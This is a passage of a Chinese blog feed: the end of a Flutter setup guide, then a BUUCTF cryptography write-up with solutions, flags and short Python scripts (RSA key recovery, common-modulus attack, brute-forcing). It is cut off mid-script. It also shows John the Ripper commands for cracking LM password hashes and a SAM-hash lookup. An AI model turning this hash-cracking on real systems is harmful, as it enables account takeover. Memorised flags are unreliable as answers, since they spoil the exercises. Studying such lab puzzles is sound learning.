    <content type="html"><![CDATA[<p>Windows下设置Flutter的运行开发环境. 说实话, 看到移动平台的开发就觉得很麻烦，还好这次Flutter没让我太过于失望。</p><a id="more"></a><h2 id="下载必要的软件"><a href="#下载必要的软件" class="headerlink" title="下载必要的软件"></a>下载必要的软件</h2><ul><li><a href="https://git-scm.com/download/win" target="_blank" rel="noopener">GIt For Windows</a> Git工具, 在windows下的客户端.</li><li><a href="https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="noopener">Java</a> Java JDK8</li><li><a href="https://developer.android.com/studio" target="_blank" rel="noopener">Android Studio</a> 是为了安装SDK.</li><li><a href="https://flutter.dev/docs/development/tools/sdk/releases#windows" target="_blank" rel="noopener">Flutter</a>  肯定是下载最新版本啦.</li><li><a href="https://code.visualstudio.com/Download" target="_blank" rel="noopener">VS Code</a> 超级轻量的代码编辑器</li></ul><h2 id="设置环境变量"><a href="#设置环境变量" class="headerlink" title="设置环境变量"></a>设置环境变量</h2><h4 id="Java设置环境变量"><a href="#Java设置环境变量" class="headerlink" title="Java设置环境变量"></a>Java设置环境变量</h4><p>将JDK的安装目录放入环境变量 key: <code>JAVA_HOME</code> value: <code>D:\Software\Java\jdk1.8.0_231</code>  看个人情况.</p><h4 id="Flutter设置环境变量"><a href="#Flutter设置环境变量" class="headerlink" title="Flutter设置环境变量"></a>Flutter设置环境变量</h4><p>将下载的Flutter SDK解压, 放入<em>没有中文，没有空格</em>的目录下, 设置环境变量<br>将<code>Flutter</code>放入系统变量key: <code>FLUTTER_HOME</code> value: <code>D:\LearningMaterials\flutter</code><br>然后设置PATH: <code>%FLUTTER_HOME%\bin</code> 即可.</p><h4 id="VSCode安装插件"><a href="#VSCode安装插件" class="headerlink" title="VSCode安装插件"></a>VSCode安装插件</h4><ul><li>Dart</li><li>Flutter</li></ul><h2 id="检查运行环境"><a href="#检查运行环境" class="headerlink" title="检查运行环境"></a>检查运行环境</h2><h4 id="doctor"><a href="#doctor" class="headerlink" title="doctor"></a>doctor</h4><p><code>cmd</code>下运行<code>flutter doctor</code>会自动诊断当前的环境是否有异常</p><h4 id="emulators"><a href="#emulators" class="headerlink" title="emulators"></a>emulators</h4><p><code>cmd</code>下运行<code>flutter emulators</code>会列出当前可用的<code>Android</code>和<code>IOS</code>设备.<br>通过运行<code>flutter emulators --launch &lt;emulator id&gt;</code>指定列出的设备名, 即可打开设备.</p><h4 id="run"><a href="#run" class="headerlink" title="run"></a>run</h4><p><code>cmd</code>在代码根目录运行<code>flutter run</code>即可在运行的设备中打开APP, 不过第一次可能会出现未<code>license</code>的错误, 可以运行<code>flutter doctor --android-licenses</code>, 根据提示全部按<code>y</code>, 结束后再次<code>flutter run</code>即可成功运行.</p><hr><p>学习…学习…</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Windows下设置Flutter的运行开发环境. 说实话, 看到移动平台的开发就觉得很麻烦，还好这次Flutter没让我太过于失望。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Flutter" scheme="https://helianthus.top/categories/Flutter/"/>
    
    
      <category term="Android" scheme="https://helianthus.top/tags/Android/"/>
    
      <category term="Flutter" scheme="https://helianthus.top/tags/Flutter/"/>
    
      <category term="Windows" scheme="https://helianthus.top/tags/Windows/"/>
    
      <category term="IOS" scheme="https://helianthus.top/tags/IOS/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF 密码学思路WriteUP</title>
    <link href="https://helianthus.top/2019/12/03/8-BUUCTF-Crypto-WriteUP/"/>
    <id>https://helianthus.top/2019/12/03/8-BUUCTF-Crypto-WriteUP/</id>
    <published>2019-12-03T09:34:21.000Z</published>
    <updated>2020-06-03T01:22:22.339Z</updated>
    
    <content type="html"><![CDATA[<p>BUUCTF, 自己学习的过程中思路记录, 以及flag…  (目的是记录自己的思路和想法！！！)</p><p>题目地址: <a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">BUUCTF</a></p><a id="more"></a><h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><p>直接拿去<a href="https://www.somd5.com/" target="_blank" rel="noopener">SOMD5</a>解密<br><code>flag{admin1}</code></p><h3 id="看我回旋踢"><a href="#看我回旋踢" class="headerlink" title="看我回旋踢"></a>看我回旋踢</h3><p>ROT13解密, 直接<a href="http://ctf.ssleye.com/rot13.html" target="_blank" rel="noopener">在线工具</a>.<br><code>flag{5cd1004d-86a5-46d8-b720-beb5ba0417e1}</code></p><h3 id="Url编码"><a href="#Url编码" class="headerlink" title="Url编码"></a>Url编码</h3><p>用Hackbar之类的工具进行URL解码<br><code>flag{and 1=1}</code></p><h3 id="摩丝"><a href="#摩丝" class="headerlink" title="摩丝"></a>摩丝</h3><p>这可不是丝wa… 用工具直接解摩斯电码吧.<br>工具: <a href="http://ctf.ssleye.com/morse.html" target="_blank" rel="noopener">摩尔斯电码解密</a><br><code>flag{iloveyou}</code></p><h3 id="一眼就解密"><a href="#一眼就解密" class="headerlink" title="一眼就解密"></a>一眼就解密</h3><p>打开F12, 在Console中输入</p><pre class=" language-javascript"><code class="language-javascript"><span class="token function">atob</span><span class="token punctuation">(</span><span class="token string">"ZmxhZ3tUSEVfRkxBR19PRl9USElTX1NUUklOR30="</span><span class="token punctuation">)</span></code></pre><p><code>flag{THE_FLAG_OF_THIS_STRING}</code></p><h3 id="变异凯撒"><a href="#变异凯撒" class="headerlink" title="变异凯撒"></a>变异凯撒</h3><p>没思路先写脚本穷举, 发现从ascii+5开始依次出现flag关键字, 于是写脚本进行解密.</p><pre class=" language-python"><code class="language-python">cipher <span class="token operator">=</span> <span class="token string">"afZ_r9VYfScOeO_UL^RWUc"</span>index <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> num <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    temp <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> cipher<span class="token punctuation">:</span>        temp <span class="token operator">+=</span> chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> num<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>temp<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>    index <span class="token operator">+=</span> <span class="token number">1</span></code></pre><p><code>flag{Caesar_variation}</code></p><h3 id="Quoted-printable"><a href="#Quoted-printable" class="headerlink" title="Quoted-printable"></a>Quoted-printable</h3><p>工具题，没意义，也没难度，知道有这种编码就会解.<br><a href="http://ctf.ssleye.com/quoted.html" target="_blank" rel="noopener">在线工具</a><br><code>flag{那你也很棒哦}</code></p><h3 id="password"><a href="#password" class="headerlink" title="password"></a>password</h3><p>社工题目, 之前做过类似的, 知道规律就行, 没什么难度.  (别问为什么, 这就是CTF)<br><code>flag{zs19900315}</code></p><h3 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h3><p>感觉不应该是密码学, 应该是Misc题目.<br>使用WinHex把压缩包打开, 将Hex的, <code>50 4B 03 04 14 00 09 00</code>改成<code>50 4B 03 04 14 00 00 00</code>, 保存再去解压, 就会发现可以正常解压了.<br><code>flag{Adm1N-B2G-kU-SZIP}</code></p><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><p>稍微了解一下RSA加密算法就知道d怎么求了, 直接上py脚本.</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> libnump <span class="token operator">=</span> <span class="token number">473398607161</span>q <span class="token operator">=</span> <span class="token number">4511491</span>e <span class="token operator">=</span> <span class="token number">17</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>invmod<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><code>flag{125631357777427553}</code></p><h3 id="Rabbit"><a href="#Rabbit" class="headerlink" title="Rabbit"></a>Rabbit</h3><p>看题目就知道是什么加密, 直接找<a href="http://tool.chinaz.com/Tools/TextEncrypt.aspx" target="_blank" rel="noopener">在线工具</a>.<br><code>flag{Cute_Rabbit}</code></p><h3 id="丢失的MD5"><a href="#丢失的MD5" class="headerlink" title="丢失的MD5"></a>丢失的MD5</h3><p>给了一个Python脚本, 脚本是Python2的, 直接运行得到Flag. (目的是了解MD5爆破)<br><code>flag{e9032994dabac08080091151380478a2}</code></p><h3 id="篱笆墙的影子"><a href="#篱笆墙的影子" class="headerlink" title="篱笆墙的影子"></a>篱笆墙的影子</h3><p>栅栏密码, 选择2栏, 进行<strong>加密</strong>操作, flag直接出.  (注意是加密, 不是解密)<br><code>flag{wethinkwehavetheflag}</code></p><h3 id="Alice与Bob"><a href="#Alice与Bob" class="headerlink" title="Alice与Bob"></a>Alice与Bob</h3><p>通过<a href="http://factordb.com/index.php?query=98554799767" target="_blank" rel="noopener">在线工具</a>进行质因数分解, 得到两个素数, 根据题目, 将小素数放在前面, 大素数放在后面, 拼接, 进行md5 32位的加密.<br><code>flag{d450209323a847c8d01c6be47c81811a}</code></p><h3 id="rsarsa"><a href="#rsarsa" class="headerlink" title="rsarsa"></a>rsarsa</h3><p>需要了解RSA的加密过程, 才会知道解密过程, 背脚本是没有意义的。<br>建议去看看RSA原理, 推荐几个我看过的教程.<br><a href="https://www.youtube.com/watch?v=TqX0AHHwRYQ" target="_blank" rel="noopener">RSA-1</a><br><a href="https://www.youtube.com/watch?v=AS0fYRnotEo" target="_blank" rel="noopener">RSA-2</a></p><p>看完上面两个绝对会RSA基础题目解密了.<br>上Python脚本!!</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> libnump <span class="token operator">=</span>  <span class="token number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span>q <span class="token operator">=</span>  <span class="token number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span>e <span class="token operator">=</span>  <span class="token number">65537</span>c <span class="token operator">=</span>  <span class="token number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span>d <span class="token operator">=</span> libnum<span class="token punctuation">.</span>invmod<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>result <span class="token operator">=</span> pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> p<span class="token operator">*</span>q<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre><p><code>flag{5577446633554466577768879988}</code></p><h3 id="传统知识-古典密码"><a href="#传统知识-古典密码" class="headerlink" title="传统知识+古典密码"></a>传统知识+古典密码</h3><p>？这什么沙雕题目，如果看不懂<code>辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳</code>， <code>+甲子</code>就GG.<br>得出: <code>XZSDMFLZ</code><br>然后进行古典密码解密, 先<code>4栏栅栏</code>, 再<code>偏移21位凯撒</code>, 即可得出FLag<br><code>flag{SHUANGYU}</code></p><h3 id="大帝的密码武器"><a href="#大帝的密码武器" class="headerlink" title="大帝的密码武器"></a>大帝的密码武器</h3><p>说实话, 这个题目一开始我没怎么看明白, 后来找到规律就好办了.<br>先将<code>FRPHEVGL</code>进行ASCII爆破, 看题目说会出现有意义的单词, 就每次爆破的时候, ASCII大于<code>z</code>的时候， 将当前字母的ASCII码进行<code>-26</code>操作, 爆破发现<code>13</code>是有意义<code>SECURITY</code>的, 直接上脚本.</p><pre class=" language-python"><code class="language-python">cipher <span class="token operator">=</span> <span class="token string">"FRPHEVGL"</span>  <span class="token comment" spellcheck="true"># 已知的密文</span>result <span class="token operator">=</span> <span class="token string">"SECURITY"</span>  <span class="token comment" spellcheck="true"># 第一步找到的有意义单词</span>secert <span class="token operator">=</span> <span class="token number">13</span>          <span class="token comment" spellcheck="true"># 第二步找到的有意义偏移量</span>t <span class="token operator">=</span> <span class="token string">"ComeChina"</span>      <span class="token comment" spellcheck="true"># 需要解密的密文</span><span class="token comment" spellcheck="true"># 1. 爆破具体是位移多少位才是有意义的.</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> cipher<span class="token punctuation">:</span>        temp <span class="token operator">=</span> ord<span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">+</span> i        <span class="token keyword">if</span> temp <span class="token operator">></span> ord<span class="token punctuation">(</span><span class="token string">"Z"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            temp <span class="token operator">-=</span> <span class="token number">26</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 2. 找规律, 发现都是根据13来的.</span>temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i<span class="token punctuation">,</span> j <span class="token keyword">in</span> zip<span class="token punctuation">(</span>cipher<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    j <span class="token operator">=</span> ord<span class="token punctuation">(</span>j<span class="token punctuation">)</span>    <span class="token keyword">if</span> i <span class="token operator">></span> j<span class="token punctuation">:</span>        temp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>j <span class="token operator">-</span> i<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        temp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>j <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 3. 根据题目规律爆破, 超过z就-26, 即可得到Flag</span><span class="token keyword">for</span> i <span class="token keyword">in</span> t<span class="token punctuation">:</span>    t <span class="token operator">=</span> ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> secert    <span class="token keyword">if</span> t <span class="token operator">></span> ord<span class="token punctuation">(</span><span class="token string">"z"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        t <span class="token operator">-=</span> <span class="token number">26</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span></code></pre><p><code>flag{PbzrPuvan}</code></p><h3 id="Windows系统密码"><a href="#Windows系统密码" class="headerlink" title="Windows系统密码"></a>Windows系统密码</h3><p>下载下来附件拿去<code>Kali</code>使用<code>John</code>工具进行解密.</p><pre class=" language-shell"><code class="language-shell">john pass.hashjohn --show --format=LM pass.hash</code></pre><p>有点坑, 要小写.<br><code>flag{good-luck}</code></p><h3 id="RSA1"><a href="#RSA1" class="headerlink" title="RSA1"></a>RSA1</h3><p>已知dp,dq求解: 题目给了dp, dq, 需要去了解一下dp,dq是什么, 然后直接脚本做题.</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token keyword">import</span> binascii<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>dp<span class="token punctuation">,</span>dq<span class="token punctuation">,</span>p<span class="token punctuation">,</span>q<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    InvQ <span class="token operator">=</span> libnum<span class="token punctuation">.</span>invmod<span class="token punctuation">(</span>q<span class="token punctuation">,</span>p<span class="token punctuation">)</span>    mp <span class="token operator">=</span> pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span>dp<span class="token punctuation">,</span>p<span class="token punctuation">)</span>    mq <span class="token operator">=</span> pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span>dq<span class="token punctuation">,</span>q<span class="token punctuation">)</span>    m<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>mp<span class="token operator">-</span>mq<span class="token punctuation">)</span><span class="token operator">*</span>InvQ<span class="token punctuation">)</span><span class="token operator">%</span>p<span class="token punctuation">)</span><span class="token operator">*</span>q<span class="token operator">+</span>mq    <span class="token keyword">print</span> <span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><code>flag{W31c0m3_70_Ch1n470wn}</code></p><h3 id="RSA3"><a href="#RSA3" class="headerlink" title="RSA3"></a>RSA3</h3><p>题目给了两个<code>c</code>, 两个<code>e</code>, 一个<code>n</code>, 典型的<code>RSA共模攻击</code>, 直接一把梭.</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token keyword">import</span> binascii<span class="token keyword">def</span> <span class="token function">RSACommonMode</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">egcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> b <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> a<span class="token punctuation">,</span> <span class="token number">0</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            x<span class="token punctuation">,</span> y <span class="token operator">=</span> egcd<span class="token punctuation">(</span>b<span class="token punctuation">,</span> a <span class="token operator">%</span> b<span class="token punctuation">)</span>            <span class="token keyword">return</span> y<span class="token punctuation">,</span> x <span class="token operator">-</span> <span class="token punctuation">(</span>a <span class="token operator">//</span> b<span class="token punctuation">)</span> <span class="token operator">*</span> y    s <span class="token operator">=</span> egcd<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span>    s1 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    s2 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> s1 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>        s1 <span class="token operator">=</span> <span class="token operator">-</span> s1        c1 <span class="token operator">=</span> libnum<span class="token punctuation">.</span>invmod<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">elif</span> s2 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>        s2 <span class="token operator">=</span> <span class="token operator">-</span> s2        c2 <span class="token operator">=</span> libnum<span class="token punctuation">.</span>invmod<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    m <span class="token operator">=</span> pow<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> s1<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">*</span> pow<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> s2<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">%</span> n    <span class="token keyword">print</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><code>flag{49d91077a1abcb14f1a9d546c80be9ef}</code></p><h3 id="凯撒？替换？呵呵"><a href="#凯撒？替换？呵呵" class="headerlink" title="凯撒？替换？呵呵!"></a>凯撒？替换？呵呵!</h3><p>一堆看不懂的乱码, 扔去<a href="https://quipqiup.com/" target="_blank" rel="noopener">quipqiup</a>进行字符频率统计, 就可以得到flag了.</p><p>大坑, 空格要删除掉.<br><code>flag{substitutioncipherdecryptionisalwayseasyjustlikeapieceofcake}</code></p><h2 id="权限获得第一步"><a href="#权限获得第一步" class="headerlink" title="权限获得第一步"></a>权限获得第一步</h2><p>得到了一个txt, 里面是Windows SAM的内容, 格式是: <code>UserName:ID:HASH:HASH:::</code>, 将最后一段HASH去md5在线破解搜出来就是flag<br><code>flag{3617656}</code></p><h2 id="萌萌哒的八戒"><a href="#萌萌哒的八戒" class="headerlink" title="萌萌哒的八戒"></a>萌萌哒的八戒</h2><p>从网上找个猪圈密码对照表, 一个一个对照出来就可以了.<br><code>flag{whenthepigwanttoeat}</code></p><h2 id="世上无难事"><a href="#世上无难事" class="headerlink" title="世上无难事"></a>世上无难事</h2><p>一堆看不懂的, 扔去<a href="https://quipqiup.com/" target="_blank" rel="noopener">词频分析</a>, 得到flag, 但是提交的时候需要全小写.<br><code>flag{640e11012805f211b0ab24ff02a1ed09}</code></p><h2 id="robomunication"><a href="#robomunication" class="headerlink" title="robomunication"></a>robomunication</h2><p>是一段音频, 听了一下感觉像是摩斯电码, 放到<code>Audacity</code>分析.<br><code>flag{BOOPBEEP}</code></p><h2 id="异性相吸"><a href="#异性相吸" class="headerlink" title="异性相吸"></a>异性相吸</h2><p>key文件中一一对asdasdad之类的, 密文则是一段乱码, 猜可能是把asdasd的ascii码拿来对应密文进行异或.<br>写个脚本</p><pre class=" language-python"><code class="language-python"><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"key.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> key<span class="token punctuation">:</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"密文.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> cipher<span class="token punctuation">:</span>        keyData <span class="token operator">=</span> key<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        cipherData <span class="token operator">=</span> cipher<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i<span class="token punctuation">,</span> j <span class="token keyword">in</span> zip<span class="token punctuation">(</span>keyData<span class="token punctuation">,</span> cipherData<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> ord<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span></code></pre><p><code>flag{ea1bc0988992276b7f95b54a7435e89e}</code></p><h2 id="还原大师"><a href="#还原大师" class="headerlink" title="还原大师"></a>还原大师</h2><p>给了个残缺的原文, 残缺的md5, 但是提示原文缺失的是大写字母, 那就简单了, 写个脚本爆破出来</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> string<span class="token keyword">import</span> hashlibsSet <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_uppercase<span class="token keyword">for</span> i <span class="token keyword">in</span> sSet<span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> sSet<span class="token punctuation">:</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> sSet<span class="token punctuation">:</span>            m <span class="token operator">=</span> f<span class="token string">"TASC{i}O3RJMV{j}WDJKX{k}ZM"</span>            md5 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>            md5<span class="token punctuation">.</span>update<span class="token punctuation">(</span>m<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            result <span class="token operator">=</span> md5<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"E903"</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span></code></pre><p><code>flag{E9032994DABAC08080091151380478A2}</code></p><h2 id="传感器"><a href="#传感器" class="headerlink" title="传感器"></a>传感器</h2><p>没头绪, 不争气的去搜了搜wp, 原来是<code>曼彻斯特编码</code>, 那没事了.<br>网上大佬的脚本</p><pre class=" language-python"><code class="language-python">cipher<span class="token operator">=</span><span class="token string">'5555555595555A65556AA696AA6666666955'</span><span class="token keyword">def</span> <span class="token function">iee</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp<span class="token operator">=</span><span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        a<span class="token operator">=</span>bin<span class="token punctuation">(</span>eval<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token operator">+</span>cipher<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>        tmp<span class="token operator">=</span>tmp<span class="token operator">+</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>    plain<span class="token operator">=</span><span class="token punctuation">[</span>hex<span class="token punctuation">(</span>int<span class="token punctuation">(</span>tmp<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>plain<span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>iee<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span></code></pre><p><code>flag{FFFFFED31F645055F9}</code></p><h2 id="Cipher"><a href="#Cipher" class="headerlink" title="Cipher"></a>Cipher</h2><p><a href="http://rumkin.com/tools/cipher/playfair.php" target="_blank" rel="noopener">在线工具</a>解出<br><img src="/images/8/2.jpg" alt><br><code>flag{itisnotaproblemhavefun}</code></p><h2 id="RSAROLL"><a href="#RSAROLL" class="headerlink" title="RSAROLL"></a>RSAROLL</h2><p>就是简单的RSA, 密文很多. 写个脚本就可以了.</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token comment" spellcheck="true"># {920139713,19}</span>n <span class="token operator">=</span> <span class="token number">920139713</span>p <span class="token operator">=</span> <span class="token number">18443</span>q <span class="token operator">=</span> <span class="token number">49891</span>e <span class="token operator">=</span> <span class="token number">19</span>d <span class="token operator">=</span> libnum<span class="token punctuation">.</span>invmod<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"data.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> fp<span class="token punctuation">.</span>readlines<span class="token 